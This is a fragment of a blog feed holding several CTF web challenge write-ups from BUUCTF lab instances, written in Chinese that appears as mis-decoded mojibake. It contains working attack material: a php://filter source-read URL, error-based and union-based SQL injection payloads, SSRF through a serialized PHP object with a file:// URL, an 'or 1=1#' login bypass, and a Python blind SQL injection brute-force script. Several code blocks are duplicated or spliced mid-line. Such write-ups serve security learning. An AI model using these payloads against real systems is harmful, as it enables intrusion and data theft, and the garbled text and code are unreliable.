alt=""><br>æœ‰ç‚¹æ‡µ<br>burpä¸ŠæŸ¥çœ‹ä¸€ä¸‹<br>ä¹Ÿæ²¡æœ‰<br>çœ‹çœ‹æ§åˆ¶å°çš„å±æ€§æ˜¯ä¸æ˜¯è®¾ç½®æˆhiddenäº†<br>åŒæ ·ä¹Ÿæ²¡æœ‰<br>çœŸçš„æ°”ï¼Œåˆ°æœ€åä¸€æ­¥äº†å´æ‰¾ä¸åˆ°flag<br>å¥½ä¹…ä¹‹åæ‰æƒ³èµ·æ¥flag.phpï¼Œä¸€ä¸ªphpæ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¯»å®ƒçš„æºç å•Š</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://22795964-60ec-4bea-9b8c-6b944c4ea759.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></tbody></table></figure><p>æœç„¶ï¼Œè¿”å›äº†flag.phpçš„base64ç¼–ç ï¼Œéšåè§£ç å°±å¯ä»¥å¾—åˆ°flag<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/7.jpg" alt=""><br>å“ï¼Œè¯´åˆ°åº•è¿˜æ˜¯å¤ªèœï¼Œç»éªŒä¹Ÿå°‘</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[ç½‘é¼æ¯ 2018]Fakebook</title>
      <link href="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/"/>
      <url>/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»é™†è¿›å»<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>æœ‰ä¸€ä¸ª<code>view.php?no=1</code>çš„é¡µé¢ï¼Œçœ‹èµ·æ¥å¯ä»¥sqlæ³¨å…¥<br>åŠ ä¸ªå•å¼•å·æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>æŠ¥é”™<br>é‚£ä¹ˆæŠ¥é”™æ³¨å…¥èµ°ä¸€æ³¢</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash">?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select database())),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">'fakebook'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">'users'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string"><code class="language-hljs bash">?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select database())),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">'fakebook'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">'users'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(data) from users)),1)--+<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/5.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°ç”¨æˆ·ä¿¡æ¯çš„æ–¹å¼æ˜¯åºåˆ—åŒ–çš„<br>é‚£æ¥ä¸‹æ¥è¯¥æ€ä¹ˆåšï¼Œå¥½åƒæ²¡äº†çº¿ç´¢<br>emmmmmm<br>æ‰«ä¸€æ³¢ç›®å½•å§<br>æœç„¶æ‰«åˆ°äº†å¥½ä¸œè¥¿<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/9.jpg" alt=""><br>ä¸‹è½½æ¥çœ‹çœ‹</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span><br>    </span>{<br>        <span class="hljs-keyword">$this</span>-&gt;name = $name;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span><br>    </span>{<br>        $ch = curl_init();<br><br>        curl_setopt($ch, CURLOPT_URL, $url);<br>        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        $output = curl_exec($ch);<br>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        }<br>        curl_close($ch);<br><br>        <span class="hljs-keyword">return</span> $output;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span><br>    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span><br>    </span>{<br>        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span><br>    </span>{<br>        <span class="hljs-keyword">$this</span>-&gt;name = $name;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span><br>    </span>{<br>        $ch = curl_init();<br><br>        curl_setopt($ch, CURLOPT_URL, $url);<br>        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        $output = curl_exec($ch);<br>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        }<br>        curl_close($ch);<br><br>        <span class="hljs-keyword">return</span> $output;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span><br>    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span><br>    </span>{<br>        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>å®¡è®¡ä»£ç <br>å®šä¹‰äº†ä¸€ä¸ªUserinfoç±»ï¼Œå±æ€§å°±æ˜¯æˆ‘ä»¬æ³¨å†Œæ—¶è¾“å…¥çš„é‚£äº›<br>å…¶ä¸­æœ‰ä¸€ä¸ªgetæ–¹æ³•ï¼Œæ¥å—ä¸€ä¸ªurlå‚æ•°</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash">resource curl_init ([ string <span class="hljs-variable"><code class="language-hljs bash">resource curl_init ([ string <span class="hljs-variable">$url</span> = NULL ] )<br>åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ªcURLå¥æŸ„ï¼Œä¾›curl_setopt(), curl_exec()å’Œcurl_close() å‡½æ•°ä½¿ç”¨<br>url<br>å¦‚æœæä¾›äº†è¯¥å‚æ•°ï¼ŒCURLOPT_URL é€‰é¡¹å°†ä¼šè¢«è®¾ç½®æˆè¿™ä¸ªå€¼ã€‚ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨curl_setopt()å‡½æ•°æ‰‹åŠ¨åœ°è®¾ç½®è¿™ä¸ªå€¼<br></code></pre></td></tr></tbody></table></figure><p>å®ä¾‹</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°cURLèµ„æº</span><br>$ch = curl_init();<br><br><span class="hljs-comment">// è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span><br>curl_setopt($ch, CURLOPT_URL, <span class="hljs-string">"http://www.runoob.com/"</span>);<br>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span><br>curl_exec($ch);<br><br><span class="hljs-comment">// å…³é—­cURLèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span><br>curl_close($ch);<br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°cURLèµ„æº</span><br>$ch = curl_init();<br><br><span class="hljs-comment">// è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span><br>curl_setopt($ch, CURLOPT_URL, <span class="hljs-string">"http://www.runoob.com/"</span>);<br>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span><br>curl_exec($ch);<br><br><span class="hljs-comment">// å…³é—­cURLèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span><br>curl_close($ch);<br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure><p>æ‰€ä»¥getæ–¹æ³•å®è´¨ä¸Šå°±æ˜¯è¿”å›æˆ‘ä»¬è¯·æ±‚çš„urlçš„é¡µé¢<br>è€Œä¸‹é¢çš„çš„getBlogContentsæ–¹æ³•åˆ™æ˜¯è°ƒç”¨äº†getæ–¹æ³•æ¥è¯·æ±‚æˆ‘ä»¬è¾“å…¥çš„blog<br>å³å­˜åœ¨SSRFæ¼æ´<br>ç»“åˆæ•°æ®å­˜å‚¨çš„æ–¹å¼ï¼Œæˆ‘ä»¬çŒœæµ‹ç½‘ç«™æ˜¯é€šè¿‡è¯»å–ç”¨æˆ·blogå­—æ®µï¼Œä¹Ÿå°±æ˜¯urlå­—æ®µæ¥åŠ è½½çš„<br>è€Œåœ¨ä¹‹å‰çš„æŠ¥é”™æ³¨å…¥å½“ä¸­å·²ç»çˆ†å‡ºäº†ç½‘ç«™çš„ç»å¯¹è·¯å¾„<br>æˆ‘ä»¬å¯ä»¥æ„é€ blogå­—æ®µä¸ºflag.phpçš„ç»å¯¹è·¯å¾„æ¥è¯»å–flag</p><figure class="hljs highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs plain"><code class="language-hljs plain">libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚<br></code></pre></td></tr></tbody></table></figure><p>curlä¸ä»…æ”¯æŒhttpï¼Œhttpsåè®®ï¼Œè¿˜æ”¯æŒfileåè®®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡fileåè®®æ¥è¯»å–flag.php</p><figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">"L"</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">"file:///var/www/html/flag.php"</span>;<br>}<br>$a=<span class="hljs-keyword">new</span> UserInfo;<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">"L"</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">"file:///var/www/html/flag.php"</span>;<br>}<br>$a=<span class="hljs-keyword">new</span> UserInfo;<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span><br></code></pre></td></tr></tbody></table></figure><p>æ„é€ sqlè¯­å¥å¦‚ä¸‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,<span class="hljs-string"><code class="language-hljs bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,<span class="hljs-string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/10.jpg" alt=""><br>æŸ¥çœ‹é¡µé¢æºä»£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/11.jpg" alt=""><br>æœ‰ä¸€ä¸²base64å­—ç¬¦ä¸²ï¼Œè§£ç <br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/12.jpg" alt=""><br>å¾—åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHPååºåˆ—åŒ– </tag>
            
            <tag> æŠ¥é”™æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œç™»å½•æ¡†<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/1.jpg" alt=""><br>éšä¾¿ç™»é™†æµ‹è¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/2.jpg" alt=""><br>ä¸å‡ºæ„å¤–çš„å¤±è´¥<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/3.jpg" alt=""><br>ç™»é™†æ¡†çš„sqlè¯­å¥å¤§æ¦‚å°±æ˜¯<br><code>select * from table where username='$username' and password='$password'</code><br>é‚£ä¹ˆä¸‡èƒ½å¯†ç å…ˆèµ°ä¸€æ³¢<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/4.jpg" alt=""><br>æ„é€ æˆ<br><code>select * from table where username='admin' or 1=1#' and password='123'</code><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/5.jpg" alt=""><br>æˆåŠŸ</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> sqlä¸‡èƒ½å¯†ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/1.jpg" alt=""><br>æŸ¥çœ‹æºä»£ç ï¼Œåœ¨æœ€æœ«ç«¯å‘ç°æç¤º<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/3.jpg" alt=""><br>åŸºç¡€ï¼Œä¼ å‚cat=dogå³å¯<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/4.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack World</title>
      <link href="/LawlietLW.github.io/2020/02/09/hack-world/"/>
      <url>/LawlietLW.github.io/2020/02/09/hack-world/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯sqlæ³¨å…¥<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/1.jpg" alt=""><br>è¾“å…¥å‡ ä¸ªæ•°å­—æµ‹è¯•ä¸€ä¸‹<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/4.jpg" alt=""><br>3ä»¥åå°±æ²¡æœ‰ä¸åŒçš„å›æ˜¾äº†<br>æ¥ç€æµ‹è¯•å•å¼•å·ï¼Œè¾“å…¥1â€™æµ‹è¯•<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/5.jpg" alt=""><br>å›æ˜¾<code>bool(false)</code><br>çœ‹åˆ°boolè‡ªç„¶å°±æƒ³åˆ°boolç›²æ³¨ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¾—fuzzä¸€ä¸‹è¿‡æ»¤äº†å“ªäº›å…³é”®å­—ï¼Œç›´æ¥ä¸Šbpæµ‹è¯•<br>é•¿åº¦ä¸º472çš„éƒ½æ˜¯boolï¼Œé•¿åº¦ä¸º482çš„éƒ½è¢«æ¢æµ‹ä¸ºsqlæ³¨å…¥<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/8.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†æ³¨å…¥éœ€è¦çš„å‡½æ•°éƒ½æ²¡æœ‰è¢«è¿‡æ»¤<br>æ¥ä¸‹æ¥å°±å¼€å§‹æ„é€ payloadæ³¨å…¥<br>é¢˜ç›®å·²ç»å‘Šè¯‰æˆ‘ä»¬flagæ‰€åœ¨çš„è¡¨å’Œåˆ—éƒ½ä¸ºflag<br>æˆ‘ä»¬æ„é€ å¦‚ä¸‹payloadæƒŠé†’æµ‹è¯•<br><code>if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)--+</code><br>å¦‚æœä¸ºçœŸåˆ™è¿”å›id=1çš„ç»“æœï¼Œå¦åˆ™è¿”å›id=2çš„ç»“æœ<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/9.jpg" alt=""><br>å¦‚é¢„æœŸä¸€æ ·ï¼Œå›æ˜¾äº†id=1çš„ç»“æœ<br>å‰©ä¸‹çš„å°±æ˜¯æ„é€ ç›²æ³¨è„šæœ¬äº†ï¼Œè„šæœ¬å¯ä»¥ç”¨äºŒåˆ†æ³•ï¼Œè¿™æ ·å¿«å¾ˆå¤š<br>ä¸è¿‡æˆ‘æ‡’ï¼Œé€‰æ‹©æš´åŠ›æšä¸¾ï¼Œè„šæœ¬å¦‚ä¸‹</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">"http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"</span><br>flag=<span class="hljs-string">''</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        payload=<span class="hljs-string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j)<br>        data={<br>            <span class="hljs-string">"id"</span>:payload<br>        }<br>        r=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'Hello'</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=chr(j)<br>            print(flag)<br>            <span class="hljs-keyword">break</span><br><br>print(<span class="hljs-string"><code class="language-hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">"http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"</span><br>flag=<span class="hljs-string">''</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        payload=<span class="hljs-string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span>%(i,j)<br>        data={<br>            <span class="hljs-string">"id"</span>:payload<br>        }<br>        r=requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'Hello'</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=chr(j)<br>            print(flag)<br>            <span class="hljs-keyword">break</span><br><br>print(<span class="hljs-string">"flagä¸º:"</span>,flag)<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/10.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
